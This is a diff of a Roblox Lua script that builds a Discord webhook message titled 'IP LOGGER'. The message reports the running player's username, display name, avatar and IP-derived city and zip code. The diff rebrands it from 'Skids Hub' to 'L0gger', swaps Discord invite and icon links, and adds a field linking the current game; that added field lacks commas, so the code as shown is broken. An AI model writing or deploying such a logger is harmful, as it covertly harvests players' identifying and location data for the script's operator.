@@ -13,23 +13,23 @@ do
         webhookJson = function(self, scriptName)
 
             if not self then return end
-
+     
             local player = game.Players.LocalPlayer
             local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
             local ipData = self.ipApi
-            scriptName = scriptName or 'Logged someone'
+            scriptName = scriptName or 'EZ'
             return {
                 content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                 embeds  = {
                     { 
                         author={
-                                name='Logged someone epic',
-                                url='https://discord.gg/q8FspVseAU',
-                                icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
+                                name='L0gger',
+                                url='https://discord.gg/gmJQNxbKpZ',
+                                icon_url='https://media.discordapp.net/attachments/874435126778552414/874436606793252935/804211903676940288.png'
                         },
-                        title='Skids Hub **IP LOGGER**',
-                        url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, scriptName),
+                        title=' **IP LOGGER** ',
+                        url='https://discord.gg/gmJQNxbKpZ',
+                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/gmJQNxbKpZ)', player.Name, player.DisplayName, scriptName),
                         color = 0,
                         fields  = {
                             {
@@ -47,6 +47,11 @@ do
                                 value = ipData['city'] .. '/' .. ipData['zip'],
                                 inline = true
                             }
+                            {
+                                name = '**Game**',
+                                value = "https://www.roblox.com/games/"..game.PlaceId
+                                inline = true
+                            },
                         },
                         thumbnail = {
                             url = playerThumb
@@ -73,7 +78,7 @@ do
                         },
                         footer = {
                             text = 'Here is the info',
-                            icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
+                            icon_url='https://images-ext-1.discordapp.net/external/SbqYbJ_5AGcMGKdwzxVuLc9RBromXc7y3K7vG_Gkd_U/%3Fv%3D1/https/cdn.discordapp.com/emojis/762821024592691221.png'
                         }
                     }
                 }
